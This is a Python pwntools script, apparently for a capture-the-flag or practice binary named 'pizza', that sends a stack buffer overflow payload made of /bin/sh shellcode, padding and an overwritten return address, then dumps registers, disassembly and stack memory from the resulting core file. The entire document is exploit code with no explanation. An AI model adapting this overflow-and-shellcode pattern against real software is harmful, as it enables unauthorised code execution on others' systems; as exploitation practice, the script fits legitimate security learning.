#!/usr/bin/env python3

from pwn import *

def print_stack(rsp):
    start = rsp + 80
    end = rsp - 200

    for i in range (start, end, -8):
        print(f'addr {hex(i)}: {enhex(core.read(i, 8))}')

context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")
context(arch='amd64', os='linux', endian='little', word_size=64)

main = elf.symbols['main']
getname = elf.symbols["getname"]

ret_addr = getname.to_bytes(8, 'little')

shellcode = asm(shellcraft.amd64.linux.sh())
buffer = b'0' * 89

payload = shellcode + buffer + ret_addr

victim = process("./pizza")

print(str(victim.recvuntil(b':'), "latin-1"))

leak = victim.leak(elf.address, 6)
print(enhex(leak))

victim.sendline(b'help')

print(str(victim.recvline(), "latin-1"))
victim.sendline(b'10')

print(str(victim.recvuntil(b':'), "latin-1"))
victim.sendline(payload)

print(str(victim.recvuntil(b':'), "latin-1"))
print(str(victim.recvline(), "latin-1"))
victim.wait()

# print(str(victim.recvline(), "latin-1"))

core = victim.corefile
rsp = core.rsp
rbp = core.rbp
rip = core.rip

print(f'rsp = {hex(rsp)} ()')
print(f'rbp = {hex(rbp)} (Leave did this)')
print(f'rip = {hex(rip)} (Offending instruction)')

print(disasm(core.read(rip, 8)))

print_stack(rsp)

exit()
